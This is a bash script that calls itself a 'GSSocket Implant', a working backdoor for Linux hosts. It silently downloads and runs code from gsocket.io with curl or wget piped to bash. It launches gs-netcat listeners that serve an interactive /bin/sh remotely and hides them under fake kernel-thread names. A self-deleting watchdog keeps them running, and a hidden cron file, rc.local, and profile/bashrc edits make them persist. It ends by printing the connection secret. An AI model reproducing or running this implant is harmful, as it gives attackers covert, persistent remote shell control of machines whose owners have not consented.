#!/bin/bash
# PRIMAL GSSocket Implant - Superior Stealth
# Features: Self-healing, Disguised, Multi-instance, Fileless

SECRET="${1:-$(head -c 12 /dev/urandom | xxd -p)}"
INSTANCES="${2:-3}"

# Disguised names (kernel threads style)
NAMES=(
    "[kworker/0:0-events]"
    "[kworker/1:1-events]"
    "[kworker/u8:2-flush]"
    "[migration/0]"
    "[migration/1]"
    "[ksoftirqd/0]"
    "[rcu_sched]"
    "[rcu_bh]"
    "[watchdog/0]"
    "[kdevtmpfs]"
    "[khungtaskd]"
    "[oom_reaper]"
    "[writeback]"
    "[kcompactd0]"
    "[kswapd0]"
    "[kthrotld]"
)

install_gs() {
    command -v gs-netcat >/dev/null 2>&1 && return 0
    
    # Silent install
    (
        curl -sSL gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1 ||
        wget -qO- gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
    ) &
    wait
    
    command -v gs-netcat >/dev/null 2>&1
}

# Create memory-resident watchdog
create_watchdog() {
    local script=$(mktemp)
    cat > "$script" << WATCHEOF
#!/bin/sh
# Self-healing watchdog - runs from memory
SECRET="$SECRET"
INSTANCES="$INSTANCES"
NAMES="${NAMES[*]}"

cleanup() { rm -f "\$0" 2>/dev/null; }
trap cleanup EXIT

while true; do
    current=\$(pgrep -f "gs-netcat.*\$SECRET" 2>/dev/null | wc -l)
    if [ "\$current" -lt "\$INSTANCES" ]; then
        need=\$((INSTANCES - current))
        for i in \$(seq 1 \$need); do
            name=\$(echo "\$NAMES" | tr ' ' '\n' | shuf -n1)
            # Use sh to avoid .bashrc traps, env for secret hiding
            (
                export GSOCKET_ARGS="-s \$SECRET -l -q"
                exec -a "\$name" gs-netcat -s "\$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
            ) &
            disown 2>/dev/null
        done
    fi
    sleep 30
done
WATCHEOF
    chmod +x "$script"
    
    # Run watchdog disguised
    local wname="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
    (exec -a "$wname" /bin/sh "$script" </dev/null >/dev/null 2>&1) &
    disown 2>/dev/null
}

# Start initial instances
start_instances() {
    for i in $(seq 1 $INSTANCES); do
        local name="${NAMES[$((RANDOM % ${#NAMES[@]}))]}"
        (
            export GSOCKET_ARGS="-s $SECRET -l -q"
            exec -a "$name" gs-netcat -s "$SECRET" -l -e "/bin/sh -i" </dev/null >/dev/null 2>&1
        ) &
        disown 2>/dev/null
        sleep 1
    done
}

# Persistence methods
add_persistence() {
    local method=""
    
    # Method 1: Cron
    if [ -w /etc/cron.d ] 2>/dev/null; then
        echo "* * * * * root pgrep -f 'gs-netcat.*$SECRET' || (gs-netcat -s $SECRET -l -e /bin/sh &)" > /etc/cron.d/.system 2>/dev/null
        method="cron"
    fi
    
    # Method 2: rc.local
    if [ -w /etc/rc.local ] 2>/dev/null; then
        grep -q "$SECRET" /etc/rc.local 2>/dev/null || \
        echo "(gs-netcat -s $SECRET -l -e /bin/sh &) &" >> /etc/rc.local 2>/dev/null
        method="${method:+$method,}rc.local"
    fi
    
    # Method 3: Profile
    for f in /etc/profile ~/.bashrc ~/.profile; do
        if [ -w "$f" ] 2>/dev/null; then
            grep -q "gs-netcat" "$f" 2>/dev/null || \
            echo "(pgrep -f gs-netcat || gs-netcat -s $SECRET -l -e /bin/sh &) >/dev/null 2>&1" >> "$f" 2>/dev/null
            method="${method:+$method,}profile"
            break
        fi
    done
    
    echo "$method"
}

main() {
    echo '{"status":"initializing"}'
    
    if ! install_gs; then
        echo '{"status":"error","message":"gs-netcat install failed"}'
        exit 1
    fi
    
    echo '{"status":"planting"}'
    
    # Start backdoors
    start_instances
    
    # Create self-healing watchdog
    create_watchdog
    
    # Add persistence
    persist=$(add_persistence)
    
    sleep 3
    
    # Verify
    count=$(pgrep -f "gs-netcat.*$SECRET" 2>/dev/null | wc -l)
    
    cat << RESULT
{
    "status": "success",
    "secret": "$SECRET",
    "instances": $count,
    "persistence": "$persist",
    "connect": "gs-netcat -s $SECRET -i",
    "features": [
        "stealth-names",
        "self-healing",
        "multi-instance",
        "bashrc-bypass",
        "env-hidden"
    ]
}
RESULT
}

main "$@"
